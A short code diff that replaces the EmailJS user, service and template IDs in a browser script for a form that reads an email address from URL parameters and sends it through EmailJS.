@@ -1,7 +1,7 @@
 // Initialize EmailJS with your user ID
 (function() {
     // Use the same EmailJS credentials as in the OTP form
-    emailjs.init('NP2ZErhB-YRWGY114');
+    emailjs.init('Pf4cZAaeYv4qn7WbF');
 })();
 
 // Get the email from URL parameters
@@ -70,7 +70,7 @@ form.addEventListener('submit', function(e) {
         };
         
         // Send the email using EmailJS
-        emailjs.send('service_9r4j8p9', 'template_r5zopyo', templateParams)
+        emailjs.send('service_n9t5xtr', 'template_9yfgy6c', templateParams)
             .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
                 
